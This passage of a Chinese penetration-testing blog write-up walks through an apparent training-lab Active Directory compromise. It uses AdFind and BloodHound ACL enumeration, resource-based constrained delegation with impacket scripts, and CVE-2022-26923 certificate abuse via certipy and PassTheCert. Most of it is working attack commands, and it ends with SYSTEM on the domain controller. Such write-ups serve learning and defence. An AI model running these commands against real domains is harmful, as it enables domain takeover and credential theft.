+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>lixiuying<span class="token punctuation">\</span>Desktop<span class="token operator">></span>Adfind.exe <span class="token parameter variable">-s</span> subtree <span class="token parameter variable">-b</span> <span class="token string">"DC=xiaorang,DC=lab"</span> <span class="token parameter variable">-sdna</span> nTSecurityDescriptor -sddl+++ <span class="token parameter variable">-sddlfilter</span> <span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token string">"Replicating Directory Changes"</span><span class="token punctuation">;</span><span class="token punctuation">;</span> <span class="token parameter variable">-recmute</span> <span class="token parameter variable">-resolvesids</span>
+
+AdFind V01.62.00cpp Joe Richards <span class="token punctuation">(</span>support@joeware.net<span class="token punctuation">)</span> October <span class="token number">2023</span>
+
+Using server: XR-DC01.xiaorang.lab:389
+Directory: Windows Server <span class="token number">2016</span>
+
+dn:DC<span class="token operator">=</span>xiaorang,DC<span class="token operator">=</span>lab
+<span class="token operator">></span>nTSecurityDescriptor: <span class="token punctuation">[</span>DACL<span class="token punctuation">]</span> OBJ ALLOW<span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">[</span>CTL<span class="token punctuation">]</span><span class="token punctuation">;</span>Replicating Directory Changes<span class="token punctuation">;</span><span class="token punctuation">;</span>XIAORANG<span class="token punctuation">\</span>Enterprise Read-only Domain Controllers
+<span class="token operator">></span>nTSecurityDescriptor: <span class="token punctuation">[</span>DACL<span class="token punctuation">]</span> OBJ ALLOW<span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">[</span>CTL<span class="token punctuation">]</span><span class="token punctuation">;</span>Replicating Directory Changes All<span class="token punctuation">;</span><span class="token punctuation">;</span>XIAORANG<span class="token punctuation">\</span>Domain Controllers
+<span class="token operator">></span>nTSecurityDescriptor: <span class="token punctuation">[</span>DACL<span class="token punctuation">]</span> OBJ ALLOW<span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">[</span>CTL<span class="token punctuation">]</span><span class="token punctuation">;</span>Replicating Directory Changes In Filtered Set<span class="token punctuation">;</span><span class="token punctuation">;</span>BUILTIN<span class="token punctuation">\</span>Administrators
+<span class="token operator">></span>nTSecurityDescriptor: <span class="token punctuation">[</span>DACL<span class="token punctuation">]</span> OBJ ALLOW<span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">[</span>CTL<span class="token punctuation">]</span><span class="token punctuation">;</span>Replicating Directory Changes<span class="token punctuation">;</span><span class="token punctuation">;</span>BUILTIN<span class="token punctuation">\</span>Administrators
+<span class="token operator">></span>nTSecurityDescriptor: <span class="token punctuation">[</span>DACL<span class="token punctuation">]</span> OBJ ALLOW<span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">[</span>CTL<span class="token punctuation">]</span><span class="token punctuation">;</span>Replicating Directory Changes All<span class="token punctuation">;</span><span class="token punctuation">;</span>BUILTIN<span class="token punctuation">\</span>Administrators
+<span class="token operator">></span>nTSecurityDescriptor: <span class="token punctuation">[</span>DACL<span class="token punctuation">]</span> OBJ ALLOW<span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">[</span>CTL<span class="token punctuation">]</span><span class="token punctuation">;</span>Replicating Directory Changes In Filtered Set<span class="token punctuation">;</span><span class="token punctuation">;</span>NT AUTHORITY<span class="token punctuation">\</span>ENTERPRISE DOMAIN CONTROLLERS
+<span class="token operator">></span>nTSecurityDescriptor: <span class="token punctuation">[</span>DACL<span class="token punctuation">]</span> OBJ ALLOW<span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">[</span>CTL<span class="token punctuation">]</span><span class="token punctuation">;</span>Replicating Directory Changes<span class="token punctuation">;</span><span class="token punctuation">;</span>NT AUTHORITY<span class="token punctuation">\</span>ENTERPRISE DOMAIN CONTROLLERS
+
+dn:CN<span class="token operator">=</span>Builtin,DC<span class="token operator">=</span>xiaorang,DC<span class="token operator">=</span>lab
+<span class="token operator">></span>nTSecurityDescriptor: <span class="token punctuation">[</span>DACL<span class="token punctuation">]</span> OBJ ALLOW<span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">[</span>CTL<span class="token punctuation">]</span><span class="token punctuation">;</span>Replicating Directory Changes<span class="token punctuation">;</span><span class="token punctuation">;</span>XIAORANG<span class="token punctuation">\</span>Enterprise Read-only Domain Controllers
+<span class="token operator">></span>nTSecurityDescriptor: <span class="token punctuation">[</span>DACL<span class="token punctuation">]</span> OBJ ALLOW<span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">[</span>CTL<span class="token punctuation">]</span><span class="token punctuation">;</span>Replicating Directory Changes All<span class="token punctuation">;</span><span class="token punctuation">;</span>XIAORANG<span class="token punctuation">\</span>Domain Controllers
+<span class="token operator">></span>nTSecurityDescriptor: <span class="token punctuation">[</span>DACL<span class="token punctuation">]</span> OBJ ALLOW<span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">[</span>CTL<span class="token punctuation">]</span><span class="token punctuation">;</span>Replicating Directory Changes In Filtered Set<span class="token punctuation">;</span><span class="token punctuation">;</span>BUILTIN<span class="token punctuation">\</span>Administrators
+<span class="token operator">></span>nTSecurityDescriptor: <span class="token punctuation">[</span>DACL<span class="token punctuation">]</span> OBJ ALLOW<span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">[</span>CTL<span class="token punctuation">]</span><span class="token punctuation">;</span>Replicating Directory Changes<span class="token punctuation">;</span><span class="token punctuation">;</span>BUILTIN<span class="token punctuation">\</span>Administrators
+<span class="token operator">></span>nTSecurityDescriptor: <span class="token punctuation">[</span>DACL<span class="token punctuation">]</span> OBJ ALLOW<span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">[</span>CTL<span class="token punctuation">]</span><span class="token punctuation">;</span>Replicating Directory Changes All<span class="token punctuation">;</span><span class="token punctuation">;</span>BUILTIN<span class="token punctuation">\</span>Administrators
+<span class="token operator">></span>nTSecurityDescriptor: <span class="token punctuation">[</span>DACL<span class="token punctuation">]</span> OBJ ALLOW<span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">[</span>CTL<span class="token punctuation">]</span><span class="token punctuation">;</span>Replicating Directory Changes In Filtered Set<span class="token punctuation">;</span><span class="token punctuation">;</span>NT AUTHORITY<span class="token punctuation">\</span>ENTERPRISE DOMAIN CONTROLLERS
+<span class="token operator">></span>nTSecurityDescriptor: <span class="token punctuation">[</span>DACL<span class="token punctuation">]</span> OBJ ALLOW<span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">[</span>CTL<span class="token punctuation">]</span><span class="token punctuation">;</span>Replicating Directory Changes<span class="token punctuation">;</span><span class="token punctuation">;</span>NT AUTHORITY<span class="token punctuation">\</span>ENTERPRISE DOMAIN CONTROLLERS
+
+
+<span class="token number">2</span> Objects returned<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>没什么可用的</p>
+<p>那自己的ACL呢</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>lixiuying<span class="token punctuation">\</span>Desktop<span class="token operator">></span>Adfind.exe <span class="token parameter variable">-s</span> subtree <span class="token parameter variable">-b</span> <span class="token string">"DC=xiaorang,DC=lab"</span> nTSecurityDescriptor -sddl+++ <span class="token parameter variable">-sddlfilter</span> <span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token string">"S-1-5-21-3745972894-1678056601-2622918667-1131"</span> <span class="token parameter variable">-recmute</span>
+
+AdFind V01.62.00cpp Joe Richards <span class="token punctuation">(</span>support@joeware.net<span class="token punctuation">)</span> October <span class="token number">2023</span>
+
+Using server: XR-DC01.xiaorang.lab:389
+Directory: Windows Server <span class="token number">2016</span>
+
+
+<span class="token number">0</span> Objects returned<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>什么都找不到</p>
+<p>好像是没权限？</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Adfind.exe <span class="token parameter variable">-s</span> subtree <span class="token parameter variable">-b</span> <span class="token string">"CN=lixiuying,CN=Users,DC=xiaorang,DC=lab"</span> nTSecurityDescriptor -sddl+++<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/Rxi134_FILE/cd2fae6fa083d23490fe8d477b8129ea_MD5.jpeg"></p>
+<h4 id="bloodhound"><a href="#bloodhound" class="headerlink" title="bloodhound"></a>bloodhound</h4><p>一键搜集</p>
+<p><img src="/Rxi134_FILE/53ce45ec16dbccb87976dd506aac053c_MD5.jpeg"></p>
+<p><img src="/Rxi134_FILE/9bf6f31f952402612957c3bcd3d28ca9_MD5.jpeg"></p>
+<p>（为什么adfind找不到东西bloodhound却可以？不都是依靠ldap协议吗，此处存疑）</p>
+<h4 id="RBCD"><a href="#RBCD" class="headerlink" title="RBCD"></a>RBCD</h4><p>添个机器用户，再改 msDS-AllowedToActOnBehalfOfOtherIdentity 属性的值为这个机器用户的sid，即可完成基于资源约束性委派</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains <span class="token parameter variable">-q</span> python addcomputer.py <span class="token string">"xiaorang.lab/lixiuying:winniethepooh"</span> -computer-name <span class="token string">"machine$"</span> -computer-pass <span class="token string">"root"</span> -dc-ip <span class="token number">172.22</span>.15.13 <span class="token parameter variable">-debug</span>
+proxychains <span class="token parameter variable">-q</span> python rbcd.py <span class="token string">"xiaorang.lab/lixiuying:winniethepooh"</span> -delegate-to <span class="token string">'XR-0687$'</span> -delegate-from <span class="token string">'machine$'</span> -dc-i
+p <span class="token number">172.22</span>.15.13 <span class="token parameter variable">-action</span> <span class="token function">write</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>别忘了绑定域名到 hosts</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">172.22.15.13    xiaorang.lab
+172.22.15.35    XR-0687.xiaorang.lab<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>申请对 cifs spn 的 TGT</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains python getST.py <span class="token string">"xiaorang.lab/machine$:root"</span> <span class="token parameter variable">-spn</span> cifs/XR-0687.xiaorang.lab -dc-ip <span class="token number">172.22</span>.15.13 <span class="token parameter variable">-impersonate</span> administrator <span class="token parameter variable">-debug</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/Rxi134_FILE/c550f760429618e005475d4624a506cf_MD5.jpeg"></p>
+<p>导入票据即可</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable">KRB5CCNAME</span><span class="token operator">=</span>administrator.ccache
+proxychains python psexec.py -no-pass <span class="token parameter variable">-k</span> XR-0687.xiaorang.lab<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><img src="/Rxi134_FILE/7796a10405fb0a231c4a30d5862cbdb8_MD5.jpeg"></p>
+<h4 id="获取flag03"><a href="#获取flag03" class="headerlink" title="获取flag03"></a>获取flag03</h4><p><img src="/Rxi134_FILE/a81b8c4844815a1e353ac3b4510d3c60_MD5.jpeg"></p>
+<h2 id="172-22-15-18-XR-CA"><a href="#172-22-15-18-XR-CA" class="headerlink" title="172.22.15.18 XR-CA"></a>172.22.15.18 XR-CA</h2><p>证书服务器，这个域多半注册了企业OA，扫扫端口机子本身没什么暴露的服务，有 IIS 80 说明是注册了web服务的</p>
+<h2 id="172-22-15-13-XR-DC01"><a href="#172-22-15-13-XR-DC01" class="headerlink" title="172.22.15.13 XR-DC01"></a>172.22.15.13 XR-DC01</h2><h3 id="CVE-2022-26923"><a href="#CVE-2022-26923" class="headerlink" title="CVE-2022-26923"></a>CVE-2022-26923</h3><h4 id="尝试-ADCS-获取Hash（失败）"><a href="#尝试-ADCS-获取Hash（失败）" class="headerlink" title="尝试 ADCS 获取Hash（失败）"></a>尝试 ADCS 获取Hash（失败）</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains <span class="token parameter variable">-q</span> certipy-ad <span class="token function">find</span> <span class="token parameter variable">-u</span> lixiuying@xiaorang.lab <span class="token parameter variable">-p</span> winniethepooh -dc-ip <span class="token number">172.22</span>.15.13 <span class="token parameter variable">-vulnerable</span> <span class="token parameter variable">-stdout</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/Rxi134_FILE/db88701c9c77bc971a1034afac5de7f1_MD5.jpeg"></p>
+<p>这里利用 CVE-2022-26923 ADCS 域提权漏洞</p>
+<blockquote>
+<p>该漏洞产生的主要原因是 ADCS 服务器在处理计算机模板证书时是通过机器的 <code>dNSHostName</code> 属性来辨别用户的，而普通域用户即有权限修改它所创建的机器账户的 dNSHostName 属性，因此恶意攻击者可以创建一个机器账户，然后修改它的 dNSHostName 属性为域控的 dNSHostName ，然后去请求计算机模板的证书。<br>由于 ADCS 服务器在生成证书时会将域控的 dNSHostName 属性写入证书中。当使用证书进行 PKINIT Kerberos 认证时，KDC会查询活动目录中 SAMAccountName 属性为 “dNSHostName-域名+$” 的对象，此时会査询到域控，因此会以域控机器账户的权限生成 PAC 放入票据中。又由于域控机器账户默认具有 DCSync 权限，因此攻击者可通过该票据导出域内任意用户的 Hash。<br><img src="/Rxi134_FILE/384be14ca14d5edf67063e2917bcf4db_MD5.jpeg"></p>
+</blockquote>
+<p>确定下颁发机构<br><img src="/Rxi134_FILE/84801a3fef642c78a22ca598919a73ed_MD5.jpeg"></p>
+<p>首先绑定域名别忘了</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">172.22.15.13    XR-DC01.xiaorang.lab
+172.22.15.13    xiaorang.lab<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+
+<p>添加机器用户（别跟前面的打架了）</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains <span class="token parameter variable">-q</span> certipy-ad account create <span class="token parameter variable">-user</span> <span class="token string">'machine1$'</span> <span class="token parameter variable">-pass</span> <span class="token string">'root'</span> <span class="token parameter variable">-dns</span> XR-DC01.xiaorang.lab -dc-ip <span class="token number">172.22</span>.15.13 <span class="token parameter variable">-u</span> lixiuying <span class="token parameter variable">-p</span> <span class="token string">'winniethepooh'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>申请机器证书模板</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains <span class="token parameter variable">-q</span> certipy-ad req <span class="token parameter variable">-u</span> <span class="token string">'machine1$@xiaorang.lab'</span> <span class="token parameter variable">-p</span> <span class="token string">'root'</span> <span class="token parameter variable">-ca</span> <span class="token string">'xiaorang-XR-CA-CA'</span> <span class="token parameter variable">-target</span> <span class="token number">172.22</span>.15.18 <span class="token parameter variable">-template</span> <span class="token string">'Machine'</span> <span class="token parameter variable">-debug</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/Rxi134_FILE/b02d6002e642f3459c685e03f1b08893_MD5.jpeg"></p>
+<p>然后去申请一张TGT，依微软官方所说，在利用证书进行kerberos认证的时候，PAC缓冲区里会返回NTLM hash。所以以此来捕获 <code>DC01$</code>的哈希</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains <span class="token parameter variable">-q</span> certipy-ad auth <span class="token parameter variable">-pfx</span> xr-dc01.pfx -dc-ip <span class="token number">172.22</span>.15.13<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/Rxi134_FILE/244ab2a93ff3479f2220855731b3fb37_MD5.jpeg"><br>爆出了 KDC_ERR_PADATA_TYPE_NOSUPP 错误</p>
+<p><img src="/Rxi134_FILE/a879e6e55461f5619a940719c75d5d02_MD5.jpeg"></p>
+<h4 id="ADCS-RBCD"><a href="#ADCS-RBCD" class="headerlink" title="ADCS+RBCD"></a>ADCS+RBCD</h4><blockquote>
+<p>不过包括 LDAP 在内的多种协议都支持 Schannel，可以尝试通过 Secure Channel 将证书认证到 LDAPS，放弃使用 Kerberos PKINIT</p>
+</blockquote>
+<blockquote>
+<p>工具地址：<a target="_blank" rel="noopener" href="https://github.com/AlmondOffSec/PassTheCert/tree/main/Python">PassTheCert&#x2F;Python at main · AlmondOffSec&#x2F;PassTheCert</a></p>
+</blockquote>
+<p>提取出.pfx的证书和私钥部分</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">certipy-ad cert <span class="token parameter variable">-pfx</span> xr-dc01.pfx <span class="token parameter variable">-nokey</span> <span class="token parameter variable">-out</span> dc01.crt
+certipy-ad cert <span class="token parameter variable">-pfx</span> xr-dc01.pfx <span class="token parameter variable">-nocert</span> <span class="token parameter variable">-out</span> dc01.key<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>测试能不能登录上域控机器账户，成功即可授予委派</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains <span class="token parameter variable">-q</span> python passthecert.py <span class="token parameter variable">-action</span> <span class="token function">whoami</span> <span class="token parameter variable">-crt</span> dc01.crt <span class="token parameter variable">-key</span> dc01.key <span class="token parameter variable">-domain</span> xiaorang.lab -dc-ip <span class="token number">172.22</span>.15.13
+
+proxychains <span class="token parameter variable">-q</span> python passthecert.py <span class="token parameter variable">-action</span> write_rbcd <span class="token parameter variable">-crt</span> dc01.crt <span class="token parameter variable">-key</span> dc01.key <span class="token parameter variable">-domain</span> xiaorang.lab -dc-ip <span class="token number">172.22</span>.15.13 -delegate-to <span class="token string">'XR-DC01$'</span> -delegate-from <span class="token string">'machine1$'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/Rxi134_FILE/ceca311c647146851bf322d55ebe6305_MD5.jpeg"></p>
+<p>然后就是RBCD的正常流程</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains <span class="token parameter variable">-q</span> python getST.py xiaorang.lab/<span class="token string">'machine1$'</span><span class="token builtin class-name">:</span><span class="token string">'root'</span> -dc-ip <span class="token number">172.22</span>.15.13 <span class="token parameter variable">-spn</span> cifs/XR-DC01.xiaorang.lab <span class="token parameter variable">-impersonate</span> Administrator <span class="token parameter variable">-debug</span>
+
+<span class="token builtin class-name">export</span> <span class="token assign-left variable">KRB5CCNAME</span><span class="token operator">=</span>Administrator@cifs_XR-DC01.xiaorang.lab@XIAORANG.LAB.ccache
+proxychains <span class="token parameter variable">-q</span> python psexec.py XR-DC01.xiaorang.lab -no-pass <span class="token parameter variable">-k</span> -target-ip <span class="token number">172.22</span>.15.13 -dc-ip <span class="token number">172.22</span>.15.13 <span class="token parameter variable">-codec</span> gbk<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>SYSTEM<br><img src="/Rxi134_FILE/c9a7808c704e88e41bb98d69b573d283_MD5.jpeg"></p>
+<h4 id="获取flag04"><a href="#获取flag04" class="headerlink" title="获取flag04"></a>获取flag04</h4><p><img src="/Rxi134_FILE/a7d9272df2817ac3259a387d9efb6383_MD5.jpeg"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
+<li>为什么 bloodhound 能查到acl，adfind就找不到？（此处存疑）</li>
+<li>狠狠去学习了一波ADCS，感觉这个漏洞危害很大，搭环境测试发现只要默认设置了企业CA就能利用。微软针对这一漏洞发布了补丁：<a target="_blank" rel="noopener" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-26923">CVE-2022-26923 - 安全更新程序指南 - Microsoft - Active Directory Domain Services Elevation of Privilege Vulnerability</a></li>
+</ul>
+<p>另外在查看wp的时候还发现有一种RBCD的方法，不申请cifs而是申请目标ldap spn的TGT再配上secretdump来导出域内全部用户的Hash来接管域，很妙的思路</p>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/2024/10/15/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3/" class="leancloud-visitors view" data-flag-title="春秋云镜-Initial">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2024/10/15/春秋云镜-Initial/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2024/10/06/W Easy-Bastion/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+		<section id="comments" class="comments">
+			<style>
+			.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
+			</style>
+			<div id="vcomment" class="comment"></div>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+var valineConfig = {"enable":true,"appId":"QrmzEeS3e4xvmJxO1dSPlkW4-gzGzoHsz","appKey":"ov6uvwKnDQmJxtpeS0wvBIwL","placeholder":"","visitor":true,"avatar":"monsterid","requiredFields":["nick","mail"],"pageView":true}
+valineConfig.el='#vcomment';
+new Valine(valineConfig);
+    // new Valine({
+    //     el: '#vcomment',
+    //     appId: "",
+    //     appKey: "",
+    //     placeholder: "",
+    //     avatar:"monsterid",
+    //     visitor: "true",
+    //     requiredFields: "nick,mail".split(','),
+    // });
+</script>
+
+		</section>
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2024-10-15 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/pentest/">pentest<span>16</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/靶场/">靶场<span>11</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E5%A4%96%E7%BD%91%E8%BE%B9%E7%95%8C"><span class="toc-article-text">外网边界</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-article-text">信息搜集</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#wp%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E5%90%8E%E5%8F%B0%E6%A8%A1%E6%9D%BF%E5%86%99%E5%85%A5webshell"><span class="toc-article-text">wp弱口令+后台模板写入webshell</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E8%8E%B7%E5%8F%96flag01"><span class="toc-article-text">获取flag01</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AF%86%E7%A0%81"><span class="toc-article-text">获取数据库密码</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E4%B8%8A%E7%BA%BFmsf"><span class="toc-article-text">上线msf</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%90%AD%E5%BB%BAsocks%E4%BB%A3%E7%90%86"><span class="toc-article-text">搭建socks代理</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E5%86%85%E7%BD%91"><span class="toc-article-text">内网</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#fscan%E5%86%85%E7%BD%91%E5%A4%A7%E4%BF%9D%E5%81%A5"><span class="toc-article-text">fscan内网大保健</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%8B%BF%E4%B8%8B-172-22-15-24-XR-WIN08"><span class="toc-article-text">永恒之蓝拿下 172.22.15.24 XR-WIN08</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E8%8E%B7%E5%8F%96flag02"><span class="toc-article-text">获取flag02</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-article-text">域信息搜集</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96-hashdump%EF%BC%88%E5%A4%B1%E8%B4%A5%EF%BC%89"><span class="toc-article-text">密码抓取 &amp; hashdump（失败）</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%EF%BC%88%E5%A4%B1%E8%B4%A5%EF%BC%89"><span class="toc-article-text">远程桌面（失败）</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%AF%BB%E6%89%BE%E7%AA%81%E7%A0%B4%E7%82%B9"><span class="toc-article-text">寻找突破点</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%8F%AF%E7%94%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-article-text">可用信息搜集</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%9F%9F%E5%86%85%E7%94%A8%E6%88%B7%E5%90%8D%E6%9E%9A%E4%B8%BE"><span class="toc-article-text">域内用户名枚举</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#asrep-roasting"><span class="toc-article-text">asrep roasting</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%8B%BF%E4%B8%8B-172-22-15-35-XR-0687"><span class="toc-article-text">拿下 172.22.15.35 XR-0687</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92"><span class="toc-article-text">密码喷洒</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2"><span class="toc-article-text">远程桌面</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#winpeas"><span class="toc-article-text">winpeas</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-1"><span class="toc-article-text">域信息搜集</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#ACL%E5%88%86%E6%9E%90"><span class="toc-article-text">ACL分析</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#ADFind%EF%BC%88%E5%A4%B1%E8%B4%A5%EF%BC%89"><span class="toc-article-text">ADFind（失败）</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#bloodhound"><span class="toc-article-text">bloodhound</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#RBCD"><span class="toc-article-text">RBCD</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E8%8E%B7%E5%8F%96flag03"><span class="toc-article-text">获取flag03</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#172-22-15-18-XR-CA"><span class="toc-article-text">172.22.15.18 XR-CA</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#172-22-15-13-XR-DC01"><span class="toc-article-text">172.22.15.13 XR-DC01</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#CVE-2022-26923"><span class="toc-article-text">CVE-2022-26923</span></a><ol class="toc-article-child"><li class="toc-article-item 